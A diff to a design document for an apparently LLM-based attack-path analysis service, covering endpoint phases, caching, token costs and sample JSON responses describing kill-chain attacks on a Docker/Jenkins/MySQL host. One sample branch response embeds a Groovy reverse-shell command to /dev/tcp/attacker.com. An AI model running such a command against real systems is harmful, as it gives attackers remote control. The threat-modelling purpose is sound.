+   - Return `BranchGenerationResponse` with continuation_path
+
+3. Integrate token tracking:
+   - Add `call_type=f"branch_{branch_id}"` to all branch generations
+
+**Testing:**
+- Test complete flow: `/attack-path` → `/attack-path/bifurcations` → `/attack-path/bifurcations/{idx}/branches/{id}`
 - Verify continuation paths are realistic
-- Validate MITRE ATT&CK mappings
+- Test generating multiple branches from same bifurcation
+- Check token logs show all generations grouped by request_id
+- Verify response time < 5 seconds per branch
 
-**Deliverable:** Full bifurcation analysis with complete branch paths
+**Deliverable:** On-demand branch generation working, can be called standalone or from complete endpoint
 
 ---
 
-### Phase 4: Graph Visualization (Week 4)
+### Phase 4: Complete Endpoint with Server-Side Caching ⭐ **PRIMARY PRODUCTION FEATURE**
 
-**Goal:** Add attack graph representation
+**Goal:** Implement unified `/attack-path/complete` endpoint with caching and progress tracking
 
 **Tasks:**
-1. Implement `AttackGraph` builder:
-   - Count total paths
-   - Generate ASCII tree representation
-   - Build JSON graph structure (nodes/edges)
 
-2. Add graph to response
+1. Implement request cache structure:
+   ```python
+   request_cache = {
+       "request_id": str(uuid.uuid4()),
+       "host": InputHost,           # Cached once
+       "attack_path": List[str],    # From Phase 1 (primary path)
+       "bifurcations": List[...],   # From Phase 2 (detection)
+       "branches": Dict[str, ...]   # From Phase 3 (generation)
+   }
+   ```
 
-3. Create helper functions for path traversal
+2. Implement `/attack-path/complete` endpoint:
+   - Accept `InputHost` only (client sends host params once)
+   - Initialize request cache with host parameters
+   - Create tqdm progress bar (phases: primary path, bifurcations, branches)
+   - **Phase 1:** Call `analyzer.analyze(cache["host"])` → store attack_path in cache
+   - **Phase 2:** Call `bifurcation_detector.detect(cache["attack_path"], cache["host"])` → store bifurcations in cache
+   - **Phase 3:** Loop through bifurcations, generate branches using cached data
+   - Update progress bar after each phase/branch
+   - Return `CompleteAnalysisResponse` with all results
 
-4. Update documentation
+3. Add progress tracking:
+   - Import `tqdm` library
+   - Create phase-based progress bar (primary, bifurcations, branches)
+   - Update description dynamically ("🔍 Generating primary path", "🔀 Detecting bifurcations", "🌿 Generating branch B1")
+   - Handle progress bar cleanup on errors
+
+4. Create `format_complete_response()` helper:
+   - Takes request_cache
+   - Builds comprehensive response structure
+   - Includes request_id, primary_path, bifurcations with embedded branches, total_paths count
+
+5. Add environment variable configuration:
+   - `SHOW_PROGRESS_BAR=true` (default: show progress in terminal)
+   - Allow disabling for production if desired
 
 **Testing:**
-- Generate graphs for various scenarios
-- Validate ASCII output renders correctly
-- Test JSON structure for frontend consumption
+- Send single `POST /attack-path/complete` request with host params
+- Verify progress bar shows in terminal during execution
+- Verify response includes: request_id, primary_path, bifurcations, branches
+- Verify NO duplicate host params sent to LLM (check token logs for prompt structure)
+- Verify total execution time ~23-35 seconds (depends on branch count)
+- Test with various scenarios (0 bifurcations, 1 bifurcation, multiple bifurcations)
+- Verify token logs show: 1 primary_path call + 1 bifurcation_detection call + N branch calls
 
-**Deliverable:** Complete bifurcation feature with visualization
+**Deliverable:** Production-ready complete endpoint with server-side caching and progress tracking
 
 ---
 
-### Phase 5: Optimization & Polish (Week 5)
+### Phase 5: Optimization & Polish
 
-**Goal:** Performance and quality improvements
+**Goal:** Performance improvements, quality enhancements, production hardening
 
 **Tasks:**
-1. Add caching for repeated bifurcation analyses
-2. Implement parallel LLM calls for branch generation
-3. Add probability scoring refinement
-4. Optimize prompt token usage
-5. Add comprehensive error handling
-6. Write unit tests
-7. Update all documentation
-8. Create example notebooks/scripts
 
-**Deliverable:** Production-ready bifurcation analysis
+1. Cache optimization:
+   - Add TTL-based cache for retry scenarios (optional)
+   - Implement cache cleanup after response sent
+   - Add cache size monitoring
+
+2. Progress bar enhancements:
+   - Add estimated time remaining
+   - Add detailed branch descriptions in progress bar
+   - Add execution time summary after completion
+
+3. Error handling:
+   - Graceful progress bar cleanup on errors
+   - Clear error messages with request_id
+   - Retry logic for LLM failures
+
+4. Performance:
+   - Analyze token logs to optimize prompt length
+   - Consider parallel branch generation (with progress bar thread safety)
+   - Add response time monitoring
+
+5. Token tracking enhancements:
+   - Daily/weekly cost aggregation reports
+   - Cost threshold alerts
+   - Dashboard-ready export formats
+
+6. Documentation:
+   - Update API documentation with complete endpoint examples
+   - Add backend integration guide (how to call `/attack-path/complete`)
+   - Document progress bar format and customization
+   - Create example Jupyter notebooks
+
+7. Testing:
+   - Unit tests for cache management
+   - Integration tests for complete endpoint
+   - Load tests for progress bar performance
+   - Token logger thread-safety tests
+
+**Deliverable:** Production-hardened complete endpoint with monitoring and documentation
 
 ---
 
@@ -942,39 +2152,62 @@ curl -X POST "http://localhost:8000/attack-path?include_bifurcations=true" \
 
 ### LLM Call Analysis
 
-**Standard Analysis (current):**
+**Standard Analysis (current - `/attack-path` only):**
 - 1 LLM call for primary path
 - ~2-4K tokens input, ~1-2K tokens output
 - Response time: 5-15 seconds
 - Cost: ~$0.01-0.03 per request (GPT-4)
 
-**Bifurcated Analysis (new):**
-- 1 LLM call for primary path (same as above)
-- 1 LLM call for bifurcation detection (~3-5K tokens input, ~1K output)
-- N LLM calls for branch generation (N = number of alternatives)
+**Complete Bifurcated Analysis (`/attack-path/complete` - RECOMMENDED):**
+- 1 LLM call for primary path (~2-4K input, ~1-2K output)
+- 1 LLM call for bifurcation detection (~3-5K input, ~1K output)
+- N LLM calls for branch generation (N = number of bifurcations × alternatives per bifurcation)
   - Each branch: ~3-5K tokens input, ~1-2K tokens output
+- **Server-side caching:** Host params cached, formatted prompts built from cache (no duplication)
 
-**Example with 3 bifurcations (5 total alternatives):**
-- Total LLM calls: 1 + 1 + 5 = 7 calls
-- Total tokens: ~40-60K tokens
-- Response time: 30-90 seconds (sequential) or 15-30 seconds (parallel)
-- Cost: ~$0.10-0.25 per request (GPT-4)
+**Example with 1 bifurcation point, 2 alternatives (using `/attack-path/complete`):**
+- Phase 1: 1 LLM call (primary path)
+- Phase 2: 1 LLM call (bifurcation detection)
+- Phase 3: 2 LLM calls (B1 and B2 auto-generated)
+- Total LLM calls: 4 calls
+- Total tokens: ~20-30K tokens
+- Response time: 23-35 seconds (all phases combined)
+- Cost: ~$0.05-0.08 per request
+- **Benefits:** Single client call, complete result, zero data duplication
+
+**Granular Approach (3 services - manual orchestration for testing/debugging):**
+- Service 1: 1 LLM call
+- Service 2: 1 LLM call (detection only)
+- Service 3: 2 LLM calls (user generates only B1 and B2 on-demand)
+- Total LLM calls: 4 calls (same as complete endpoint)
+- Total tokens: ~20-30K tokens (same as complete endpoint)
+- Response time: 5-15 sec + 5-10 sec + 3-5 sec × 2 = 13-30 seconds (if done sequentially)
+- Cost: ~$0.05-0.08 (same as complete endpoint)
+- **Drawback:** 3 separate client calls, client must orchestrate, host params sent 3 times over network
 
 ### Optimization Strategies
 
-1. **Parallel Branch Generation**: Generate all branches simultaneously
-2. **Caching**: Cache bifurcation detection for similar hosts
-3. **Streaming**: Stream results as they're generated (primary → bifurcations → branches)
-4. **Model Selection**: Use faster/cheaper models for bifurcation detection (GPT-3.5)
-5. **Max Branches**: Limit number of branches per bifurcation (e.g., top 3)
+1. **Use `/attack-path/complete` for Production** (PRIMARY RECOMMENDATION)
+   - Single client call eliminates orchestration complexity
+   - Server-side caching prevents LLM data duplication
+   - Progress bar provides visibility
+   - Complete formatted result ready for frontend
+
+2. **Caching Detection**: Cache bifurcation detection for similar hosts
+3. **Caching Branches**: Cache generated branches by bifurcation fingerprint
+4. **Model Selection**: Use faster/cheaper models for detection (GPT-3.5)
+5. **Max Alternatives**: Limit alternatives per bifurcation in detection phase (e.g., top 3)
 6. **Smart Prompting**: Reuse context across branch generation calls
+7. **Parallel Branch Generation**: Generate branches in parallel (reduce Phase 3 time)
 
 ### Performance Targets
 
-- **Standard Analysis**: < 15 seconds, < $0.05
-- **Bifurcated Analysis**: < 45 seconds, < $0.20
+- **Service 1 (Primary Path)**: < 15 seconds, < $0.05
+- **Service 2 (Detection)**: < 10 seconds, < $0.02
+- **Service 3 (Branch)**: < 5 seconds, < $0.01 per branch
+- **Total (with 2 branches)**: < 30 seconds, < $0.10
 - **Max Bifurcations**: 5 decision points
-- **Max Branches per Bifurcation**: 3 alternatives
+- **Max Alternatives per Bifurcation**: 3 alternatives
 
 ---
 
@@ -1036,6 +2269,372 @@ curl -X POST "http://localhost:8000/attack-path?include_bifurcations=true" \
 
 ---
 
+## Response Examples
+
+This section provides complete examples of the responses from all three services.
+
+### Example 1: Service 1 Response (Primary Attack Path)
+
+**Endpoint:** `POST /attack-path`
+
+**Request:**
+```json
+{
+  "platform": "Linux",
+  "version_os": "Ubuntu 20.04",
+  "open_ports": [2375, 8080, 3306],
+  "services": [
+    "Docker API on port 2375",
+    "Jenkins 2.346.1 on port 8080",
+    "MySQL 5.7.33 on port 3306"
+  ],
+  "vulnerabilities": [
+    "CVE-2021-41773: Apache path traversal",
+    "CVE-2021-3156: Sudo heap overflow"
+  ],
+  "security_controls": ["fail2ban"],
+  "mfa_enabled": false,
+  "internet_exposed": true,
+  "configurations": ["Docker API exposed without TLS authentication"]
+}
+```
+
+**Response:**
+```json
+{
+  "attack_path": [
+    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
+    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
+    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
+    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
+    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
+    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
+    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
+  ]
+}
+```
+
+**Characteristics:**
+- 7 stages (complete cyber kill chain)
+- Each stage is a descriptive string
+- Contains specific techniques, tools, and attack details
+- Response time: ~5-15 seconds
+- Cost: ~$0.01-0.03
+
+---
+
+### Example 2: Service 2 Response (Bifurcation Detection)
+
+**Endpoint:** `POST /attack-path/bifurcations`
+
+**Request:**
+```json
+{
+  "attack_path": [
+    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
+    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
+    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
+    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
+    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
+    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
+    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
+  ],
+  "host": {
+    "platform": "Linux",
+    "version_os": "Ubuntu 20.04",
+    "open_ports": [2375, 8080, 3306],
+    "services": [
+      "Docker API on port 2375",
+      "Jenkins 2.346.1 on port 8080",
+      "MySQL 5.7.33 on port 3306"
+    ],
+    "vulnerabilities": [
+      "CVE-2021-41773: Apache path traversal",
+      "CVE-2021-3156: Sudo heap overflow"
+    ],
+    "security_controls": ["fail2ban"],
+    "mfa_enabled": false,
+    "internet_exposed": true,
+    "configurations": ["Docker API exposed without TLS authentication"]
+  }
+}
+```
+
+**Response:**
+```json
+{
+  "bifurcations": [
+    {
+      "stage_index": 3,
+      "stage_name": "Exploitation",
+      "attacker_context": "Attacker has deployed a privileged container with host filesystem access and network visibility to internal services (Jenkins on 8080, MySQL on 3306).",
+      "decision_point": "From the container position, the attacker can see multiple exploitable services on the internal network. Instead of continuing with container escape, the attacker could pivot to these services.",
+      "alternatives": [
+        {
+          "id": "B1",
+          "technique": "Pivot to Jenkins exploitation",
+          "reason": "Jenkins 2.346.1 is accessible from container network without authentication. The /script endpoint allows arbitrary Groovy code execution.",
+          "probability": "high"
+        },
+        {
+          "id": "B2",
+          "technique": "Pivot to MySQL database",
+          "reason": "MySQL 5.7.33 is accessible from container with potential default credentials or weak authentication. Can lead to UDF code execution.",
+          "probability": "medium"
+        }
+      ]
+    },
+    {
+      "stage_index": 4,
+      "stage_name": "Installation",
+      "attacker_context": "Attacker has achieved persistence via container restart policy and has root-level access through mounted host filesystem.",
+      "decision_point": "Multiple persistence mechanisms are available at this privilege level, offering redundancy and stealth alternatives.",
+      "alternatives": [
+        {
+          "id": "B3",
+          "technique": "Systemd service persistence",
+          "reason": "Can create malicious systemd service unit for automatic execution on boot. More stealthy than SSH key modification.",
+          "probability": "high"
+        },
+        {
+          "id": "B4",
+          "technique": "Cron job persistence",
+          "reason": "Can install cron jobs in /etc/cron.d/ for periodic execution. Less likely to be detected than systemd services.",
+          "probability": "medium"
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Characteristics:**
+- Identifies 2 bifurcation points (at stages 3 and 4)
+- Each bifurcation has 2+ alternative techniques
+- Contains metadata ONLY (no continuation paths yet)
+- Includes probability assessment (high/medium/low)
+- Response time: ~5-10 seconds (1 LLM call)
+- Cost: ~$0.01-0.02
+
+**Key Point:** User now sees all decision points immediately and can choose which branches to explore in Service 3.
+
+---
+
+### Example 3: Service 3 Response (Branch Generation)
+
+**Endpoint:** `POST /attack-path/bifurcations/0/branches/B1`
+
+**Request:**
+```json
+{
+  "attack_path": [
+    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
+    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
+    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
+    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
+    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
+    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
+    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
+  ],
+  "host": {
+    "platform": "Linux",
+    "version_os": "Ubuntu 20.04",
+    "open_ports": [2375, 8080, 3306],
+    "services": [
+      "Docker API on port 2375",
+      "Jenkins 2.346.1 on port 8080",
+      "MySQL 5.7.33 on port 3306"
+    ],
+    "vulnerabilities": [
+      "CVE-2021-41773: Apache path traversal",
+      "CVE-2021-3156: Sudo heap overflow"
+    ],
+    "security_controls": ["fail2ban"],
+    "mfa_enabled": false,
+    "internet_exposed": true,
+    "configurations": ["Docker API exposed without TLS authentication"]
+  },
+  "bifurcation_index": 0,
+  "branch_id": "B1"
+}
+```
+
+**Response:**
+```json
+{
+  "branch_id": "B1",
+  "bifurcation_index": 0,
+  "from_stage": 3,
+  "continuation_path": [
+    "Installation: From container, access Jenkins /script endpoint without authentication. Execute Groovy script to gain code execution on Jenkins server: 'def proc = \"bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\".execute(); println proc.text'. Establish foothold on Jenkins host.",
+    "Command and Control: Set up persistent reverse shell from Jenkins server to attacker infrastructure. Jenkins process runs as 'jenkins' user with access to all build artifacts and credentials. Configure automatic reconnection via Jenkins system Groovy script hook.",
+    "Actions on Objectives: Access Jenkins credentials store containing AWS keys, GitHub tokens, and production database passwords. Exfiltrate CI/CD pipeline secrets including service account credentials. Download all build artifacts and source code repositories accessible to Jenkins. Leverage AWS credentials to access production cloud infrastructure."
+  ]
+}
+```
+
+**Characteristics:**
+- Contains continuation path for ONE specific branch (B1)
+- Starts from the bifurcation point (stage 3)
+- Generates remaining stages (4-7 → Installation, C2, Actions on Objectives)
+- Specific to the alternative technique (Jenkins exploitation)
+- Response time: ~3-5 seconds (1 LLM call)
+- Cost: ~$0.005-0.01
+
+**User Control:** If user is also interested in branch B2 (MySQL pivot), they can call:
+`POST /attack-path/bifurcations/0/branches/B2`
+
+This generates the MySQL branch continuation independently, and user only pays for what they need!
+
+---
+
+### Example 4: Complete Endpoint Response ⭐ **RECOMMENDED FOR PRODUCTION**
+
+**Endpoint:** `POST /attack-path/complete`
+
+**Request (Single Call):**
+```json
+{
+  "platform": "Linux",
+  "version_os": "Ubuntu 20.04",
+  "open_ports": [2375, 8080, 3306],
+  "services": [
+    "Docker API on port 2375",
+    "Jenkins 2.346.1 on port 8080",
+    "MySQL 5.7.33 on port 3306"
+  ],
+  "vulnerabilities": [
+    "CVE-2021-41773: Apache path traversal",
+    "CVE-2021-3156: Sudo heap overflow"
+  ],
+  "security_controls": ["fail2ban"],
+  "mfa_enabled": false,
+  "internet_exposed": true,
+  "configurations": ["Docker API exposed without TLS authentication"]
+}
+```
+
+**Response (Complete Analysis):**
+```json
+{
+  "request_id": "550e8400-e29b-41d4-a716-446655440000",
+  "primary_path": [
+    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
+    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
+    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
+    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
+    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
+    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
+    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
+  ],
+  "bifurcations": [
+    {
+      "stage_index": 3,
+      "stage_name": "Exploitation",
+      "attacker_context": "Attacker has deployed a privileged container with host filesystem access and network visibility to internal services (Jenkins on 8080, MySQL on 3306).",
+      "decision_point": "From the container position, the attacker can see multiple exploitable services on the internal network. Instead of continuing with container escape, the attacker could pivot to these services.",
+      "branches": [
+        {
+          "branch_id": "B1",
+          "technique": "Pivot to Jenkins exploitation",
+          "reason": "Jenkins /script endpoint is accessible without authentication from container network",
+          "probability": "high",
+          "continuation_path": [
+            "Installation: From container, access Jenkins /script endpoint without authentication. Execute Groovy script to gain code execution on Jenkins server. Establish foothold on Jenkins host.",
+            "Command and Control: Set up persistent reverse shell from Jenkins server to attacker infrastructure. Jenkins process runs as 'jenkins' user with access to all build artifacts and credentials.",
+            "Actions on Objectives: Access Jenkins credentials store containing AWS keys, GitHub tokens, and production database passwords. Exfiltrate CI/CD pipeline secrets including service account credentials."
+          ]
+        },
+        {
+          "branch_id": "B2",
+          "technique": "Pivot to MySQL database compromise",
+          "reason": "MySQL accessible from container with default credentials (root/root)",
+          "probability": "medium",
+          "continuation_path": [
+            "Installation: From container, connect to MySQL using default credentials. Create malicious User Defined Function (UDF) to execute system commands. Establish code execution on database host.",
+            "Command and Control: Set up persistent backdoor via MySQL trigger that connects to attacker C2 on specific database operations.",
+            "Actions on Objectives: Dump entire production database containing customer data, credentials, and business logic. Exfiltrate via DNS tunneling to avoid detection."
+          ]
+        }
+      ]
+    }
+  ],
+  "total_paths": 3,
+  "execution_time_seconds": 23.4,
+  "llm_calls": {
+    "primary_path": 1,
+    "bifurcation_detection": 1,
+    "branch_generation": 2,
+    "total": 4
+  },
+  "estimated_cost": 0.051
+}
+```
+
+**Characteristics:**
+- ✅ **Single API call** - Client sends host params once
+- ✅ **Complete result** - Primary path + bifurcations + ALL branches included
+- ✅ **Server-side caching** - Host params cached internally, zero duplication to LLM
+- ✅ **Progress tracking** - Terminal shows: `🔍 Generating primary path... 🔀 Detecting bifurcations... 🌿 Generating branch B1... 🌿 Generating branch B2...`
+- ✅ **Request ID** - For tracking and debugging
+- ✅ **Metadata** - Execution time, LLM calls count, cost estimate
+- ✅ **Formatted response** - Ready for frontend display
+
+**Performance:**
+- Response time: ~23-35 seconds (full analysis)
+- Cost: ~$0.05-0.08 (depends on branch count)
+- LLM calls: 4 (1 primary + 1 detection + 2 branches)
+
+**Use Case:** Production deployments where you need complete attack graph analysis in one request
+
+**Terminal Output (During Execution):**
+```text
+🔍 Phase 1: Generating primary path: 50%|███████          | 1/2 [00:08<00:08, 8.2s/phase]
+🔀 Phase 2: Detecting bifurcations: 100%|█████████████████| 2/2 [00:18<00:00, 9.1s/phase]
+🌿 Generating branch B2 (bif 0, MySQL pivot): 100%|████████| 2/2 [00:05<00:00, 2.5s/branch]
+
+✅ Complete analysis finished in 23.4s
+```
+
+---
+
+### Complete Workflow Example
+
+**Production Approach (Recommended):**
+```bash
+POST /attack-path/complete → Returns complete analysis (primary + bifurcations + branches)
+Cost: $0.051 | Time: 23 seconds | Branches: ALL (2 auto-generated)
+```
+
+**Granular Approach (Testing/Debugging):**
+
+**Step 1:** Client calls Service 1
+```bash
+POST /attack-path → Returns primary path (7 stages)
+Cost: $0.02 | Time: 8 seconds
+```
+
+**Step 2:** Client calls Service 2 with same host params + primary path
+```bash
+POST /attack-path/bifurcations → Returns 2 bifurcation points with 4 alternatives (B1, B2, B3, B4)
+Cost: $0.015 | Time: 7 seconds
+```
+
+**Step 3:** User reviews alternatives, selects 2 interesting branches
+```bash
+POST /attack-path/bifurcations/0/branches/B1 → Returns Jenkins pivot continuation
+Cost: $0.008 | Time: 4 seconds
+
+POST /attack-path/bifurcations/1/branches/B3 → Returns systemd persistence continuation
+Cost: $0.008 | Time: 4 seconds
+```
+
+**Total Cost:** $0.051 (vs $0.08 if all 4 branches auto-generated)  
+**Total Time:** 23 seconds (fast detection + selective generation)  
+**Branches Generated:** 2 out of 4 available (user chose only what they needed)
+
+---
+
 ## Example Scenario
 
 ### Input: `example_request_enhanced.json`
@@ -1082,24 +2681,23 @@ curl -X POST "http://localhost:8000/attack-path?include_bifurcations=true" \
   - 6. Lateral Movement: (same as primary)
   - 7. Exfiltration: (same as primary)
 
-### Expected Attack Graph
+### Summary
 
-```
-Stage 1: Reconnaissance
-   |
-Stage 2: Initial Access (Docker API)
-   |
-Stage 3: Execution (Container) *** BIFURCATION ***
-   |
-   ├─── [Primary Path] Stage 4-7: Container Escape → Root → Exfiltration
-   |
-   ├─── [Branch B1] Stage 4-7: Jenkins RCE → Plugin Backdoor → Source Code Theft
-   |
-   └─── [Branch B2] Stage 4-7: MySQL UDF → Trigger Backdoor → Database Dump
+**Total Attack Paths:** 3
+- Primary path (Docker → Container Escape → Root)
+- Branch B1 (Jenkins RCE → Plugin Backdoor → Source Code Theft)
+- Branch B2 (MySQL UDF → Trigger Backdoor → Database Dump)
 
-Total Paths: 3
-Bifurcations: 1 major decision point
-Criticality: HIGH - Multiple viable attack vectors from single entry point
+**Bifurcation Points:** 1 (at Stage 3 - Execution)
+
+**Criticality:** HIGH - Multiple viable attack vectors from single entry point
+
+**Token Usage Summary (from logs):**
+- Primary path: ~5,000 tokens (~$0.0015)
+- Bifurcation detection: ~5,000 tokens (~$0.0015)
+- Branch B1: ~5,300 tokens (~$0.0015)
+- Branch B2: ~5,100 tokens (~$0.0014)
+- **Total: ~20,400 tokens (~$0.0059)**
 ```
 
 ---
@@ -1108,17 +2706,31 @@ Criticality: HIGH - Multiple viable attack vectors from single entry point
 
 ### Feature Complete When:
 
-✅ API accepts `include_bifurcations` query parameter  
-✅ Primary path generation unchanged (backward compatibility)  
-✅ Bifurcation detection identifies 2+ decision points for `example_request_enhanced.json`  
-✅ Each bifurcation includes 2-3 viable alternatives  
-✅ Continuation paths are complete (cover remaining kill chain stages)  
-✅ Attack graph visualization generated (ASCII + JSON)  
-✅ Response time < 60 seconds for bifurcated analysis  
+✅ `/attack-path` endpoint completely unchanged and functional  
+✅ `/attack-path/bifurcations` endpoint created and functional (detection only)  
+✅ `/attack-path/bifurcations/{bif_idx}/branches/{branch_id}` endpoint created and functional  
+✅ `BifurcationDetectionRequest` model accepts `attack_path` (list of strings) + `host` parameters  
+✅ `BranchGenerationRequest` model accepts `attack_path` + `host` + `bifurcation_index` + `branch_id`  
+✅ Service 2 uses attack_path from Service 1 as input (no regeneration)  
+✅ Service 3 generates ONE branch at a time, on-demand  
+✅ Three-service workflow validated: Client → Service 1 → Service 2 → Service 3 (for selected branches)  
+✅ Token tracking operational - all LLM calls logged to `logs/token_usage.jsonl`  
+✅ Token logs include: request_id, call_type, model, tokens, response_time, cost_estimate  
+✅ Call types: `primary_path`, `bifurcation_detection`, `branch_B1`, `branch_B2`, etc.  
+✅ Log rotation configured (10MB per file, 5 backups)  
+✅ Service 2 detects 2+ bifurcation points in provided attack_path  
+✅ Each bifurcation includes 2-3 alternative metadata items  
+✅ Service 2 response time < 10 seconds  
+✅ Service 3 generates complete continuation paths  
+✅ Service 3 response time < 5 seconds per branch  
 ✅ All LLM responses properly validated and error-handled  
+✅ Token analysis utility script functional  
 ✅ Documentation updated (README, TECHNICAL_SPECIFICATION, USAGE)  
-✅ Test scenarios created for bifurcation analysis  
-✅ Unit tests written for new components  
+✅ Test scenarios created demonstrating three-service workflow  
+✅ Unit tests written for new components (including token logger)  
+✅ Error in Service 2 doesn't affect Service 1  
+✅ Error in Service 3 doesn't affect Service 1 or 2  
+✅ Can generate branches independently without re-running detection  
 
 ---
 
@@ -1130,21 +2742,27 @@ Criticality: HIGH - Multiple viable attack vectors from single entry point
 
 3. **Probability Threshold**: Should we filter out low-probability branches? (Recommendation: include all, let user filter)
 
-4. **Visualization Format**: ASCII sufficient or need Mermaid/DOT output? (Recommendation: start with ASCII + JSON)
+4. **Visualization Format**: Minimal metadata only, or include full graph JSON? (Recommendation: minimal metadata now, full JSON when frontend ready)
 
 5. **Streaming**: Should results stream as generated? (Recommendation: defer to Phase 5)
 
 6. **Caching**: Cache bifurcation analysis by host fingerprint? (Recommendation: yes, in Phase 5)
 
+7. **Token Monitoring**: Should token usage trigger alerts/notifications? (Recommendation: start with logs only, add alerting in Phase 5)
+
+8. **Cost Optimization**: Should we use cheaper models for specific passes? (Recommendation: analyze token logs first, optimize based on data)
+
 ---
 
 ## Next Steps
 
-1. **Review this strategy document** - validate approach with stakeholders
-2. **Decide on API design** - confirm Query Parameter approach
-3. **Set up development branch** - `feature/bifurcation-analysis`
-4. **Begin Phase 1 implementation** - data models and scaffolding
-5. **Create tracking issues** - one per phase for project management
+1. **Review this strategy document** - validate hybrid architecture (complete endpoint + granular endpoints)
+2. **Confirm architecture decision** - `/attack-path/complete` as primary production endpoint with server-side caching
+3. **Set up development branch** - `feature/bifurcation-complete-endpoint`
+4. **Install dependencies** - add `tqdm>=4.66.1` to requirements.txt
+5. **Begin Phase 1 implementation** - data models and scaffolding for all 4 endpoints
+6. **Prioritize Phase 4** - `/attack-path/complete` endpoint is the primary deliverable
+7. **Create tracking issues** - one per phase for project management
 
 ---
 
@@ -1153,9 +2771,11 @@ Criticality: HIGH - Multiple viable attack vectors from single entry point
 - MITRE ATT&CK Framework: https://attack.mitre.org/
 - Cyber Kill Chain: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html
 - Attack Trees: https://en.wikipedia.org/wiki/Attack_tree
+- tqdm Progress Bar: https://github.com/tqdm/tqdm
 - Current codebase: `/home/pyramid/workspace/reveald/ai-engine`
 
 ---
 
-**Document Status:** ✅ Ready for Review  
-**Next Action:** Stakeholder approval to begin Phase 1 implementation
+**Document Status:** ✅ Ready for Implementation  
+**Primary Endpoint:** `/attack-path/complete` (server-side caching + progress tracking)  
+**Next Action:** Begin Phase 1 - Foundation & Data Models
